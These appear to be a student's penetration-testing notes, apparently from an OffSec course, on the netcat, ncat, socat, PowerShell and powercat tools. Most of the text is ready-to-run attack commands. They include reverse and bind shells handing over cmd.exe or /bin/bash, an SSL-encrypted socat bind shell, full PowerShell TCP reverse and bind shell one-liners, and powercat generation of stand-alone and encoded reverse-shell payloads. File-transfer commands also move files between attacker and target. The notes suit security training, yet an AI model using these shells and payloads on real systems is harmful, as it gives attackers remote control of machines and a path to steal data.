
NETCAT : Netcat with the -e option to execute option
 
1. As a client connecting : nc -nv 192.168.58.128 1234
2. As a server : nc -nvlp 1234
	 
	File Tranfer
	 
	Listener sending the file : 
3. nc  -nlvp 1234 < /tmp/sys.c    (to send sys.c to the client connecting)
4. nc  -nv 192.168.58.128 1234 > explt.c   (sys.c is recvied in the file explt.c) 

Listener receives the file : 

5. nc -nlvp 4444 > incoming.exe
6. nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe

 
Bind Shell  (Client getting server console) : to get a remote shell or redirect i/p , o/p and error messages to that port
 
5. nc  -nvlp 1234 -e cmd.exe     /// listner /server    ////// Now Netcat has bound TCP port 1234 to cmd.exe and will redirect any input, output, or error messages from cmd.exe to the network.
6. nc -nv 192.168.58.128 1234  ///  The client  gets the shell
	 
Reverse Shell : Listening server gets the client shell
	 
1. nc  -nvlp 1234
2. nc  -nv 192.168.58.128 1234 -e /bin/bash   ////(clients bash is sent to server) or for windows : nc  -nv 192.168.58.128 1234   -e  cmd.exe
 
Ncat : Provides encryption and authentication
 
9. ncat --exe cmd.exe --allow 192.168.58.138 --nvl 1234 --ssl
10. ncat -v 192.168.58.128 1234  --ssl

SOCAT :

File Transfer : Listener sending the file

kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

Socat Reverse Shells

C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT  //// -d is for verbosity
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash



Socat Encrypted Bind Shells

To add encryption to a bind shell, we will rely on Secure Socket Layer85 certificates.

To continue with the example of Alice and Bob, we will use the openssl application to create a selfsigned
certificate using the following options:
• req: initiate a new certificate signing request
• -newkey: generate a new private key
• rsa:2048: use RSA encryption with a 2,048-bit key length.
• -nodes: store the private key without passphrase protection
• -keyout: save the key to a file
• -x509: output a self-signed certificate instead of a certificate request
• -days: set validity period in days
• -out: save the certificate to a file

kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36
2 -out bind_shell.crt


kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem   /////Now that the key and certificate have been generated, we first need to convert them to a format
socat will accept. To do so, we combine both the bind_shell.key and bind_shell.crt files into a single .pem file before we create the encrypted socat listener.  



kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

use the OPENSSL-LISTEN option to create the listener on port 443, cert=bind_shell.pem to specify our certificate file, verify to disable SSL verification, and fork to spawn a child process
once a connection is made to the listener


C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0   //// client gets the shell



Powershell 

Reverse shell : 


sudo nc -lnvp 443

C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"


Bind SHELLS 

C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
S ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
p()"


kali@kali:~$ nc -nv 10.11.0.22 443


Powercat 


File Transfers


kali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1  //// listner recevies

PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1


Powercat Reverse Shells

kali@kali:~$ sudo nc -lvp 443

PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe


Powercat Bind Shells


PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe

kali@kali:~$ nc 10.11.0.22 443


Powercat Stand-Alone Payloads  

PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\offsec> ./reverseshell.ps1
kali@kali:~$ sudo nc -lnvp 443

PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1  //// -ge option is encoded
PS C:\Users\offsec> powershell.exe -E encodedreverseshell.ps1
kali@kali:~$ sudo nc -lnvp 443
